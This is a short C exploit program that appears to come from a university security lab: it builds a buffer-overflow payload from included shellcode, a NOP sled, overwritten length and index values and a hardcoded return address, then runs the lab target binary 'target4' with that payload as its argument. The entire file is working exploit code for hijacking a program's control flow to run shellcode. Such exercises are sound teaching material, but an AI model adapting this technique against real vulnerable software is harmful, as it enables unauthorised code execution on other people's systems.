#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target4"

int 
main(void)
{
  char *args[3];
  char *env[1];
  char* return_addr = (char*)0x2021fdb0;
  int len = 0x1fffffff;
  int i = 0x1ffffff0;

  args[0] = TARGET;
  args[2] = NULL;
  env[0] = NULL;

  int inj_size = 256;

  // Injection string
  char injection[inj_size];
  bzero(injection, inj_size);
  
  strcpy(injection, shellcode);
  memset(&injection[45], 0x90, 155);
  memcpy(&injection[(168)], &(len), sizeof(len));
  memcpy(&injection[(172)], &(i), sizeof(i));
  memcpy(&injection[(184)], &(return_addr), sizeof(return_addr));

  // Pack injection string into args[1]
  args[1] = injection;
  
  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
